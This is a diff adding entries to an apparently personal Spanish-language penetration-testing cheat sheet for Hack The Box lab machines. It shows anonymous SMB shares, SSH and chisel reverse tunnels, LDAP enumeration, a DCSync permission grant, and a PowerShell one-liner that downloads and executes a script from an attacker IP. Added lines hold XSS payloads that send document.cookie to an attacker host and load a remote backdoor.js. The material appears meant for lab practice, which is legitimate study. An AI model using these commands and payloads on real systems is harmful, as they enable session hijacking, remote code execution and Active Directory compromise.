@@ -146,6 +146,8 @@ smbclient -N \\10.10.10.27\backups
 
 Crear una unidad de red para compartir con usuario y contraseña.
 impacket-smbserver Sfire $(pwd) -smb2support -user diego -password Contrasenia
+Crear una unidad de red para compartir sin usuario y contraseña.
+impacket-smbserver www $(pwd) -smb2support
 *********************************************************Tunnel ssh ****************************************
 ssh -i root.key -L9000:10.10.10.75:80 10.10.10.73
 L9000: Puerto local a publicar
@@ -316,6 +318,10 @@ $cred
 Mapar unidad de red con credenciales almacenados en powershell.
 New-PSDrive -Name diego -PSProvider FileSystem -Credential $cred -Root \\10.10.14.45\Sfire
 
+Mapear unidad de red sin credenciales
+Crear servidor smb impacket-smbserver www $(pwd) -smb2support
+New-PSDrive -name www -PSProvider "FileSystem" -Root "\\10.10.14.20\www"
+
 Buscar usuario de un directorio activo y sacarlos en un archivo
 ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' > person.out
 ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName |grep sAMAccountName  | awk '{print $2}' >userlist.ldap
@@ -327,4 +333,13 @@ Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
 LinEnum.py en linux
 winPEAS.exe en windows
 Sherlocak.ps1 script para vulnerabilidaes echo IEX(New-Object Net.WebClient).downloadString("http://192.168.0.5/Sherlock.ps1") | powershell -noprofile -
+***********************************************XSS****************************************
+Bankrobber
+<img src=http://10.10.14.20/diego.jpeg />
+<img src=x onerror=this.src="http://10.10.14.20/?cookie=" btoa(document.cookie) />
+<script src=http://10.10.14.20/backdoor.js></script>
+
+********************************************Tunneling reverse connection*************************Bankrobber
+./chisel.exe client 10.10.14.20:9002 R:910:127.0.0.1:910
+python chisel server 9002 --reverse
 
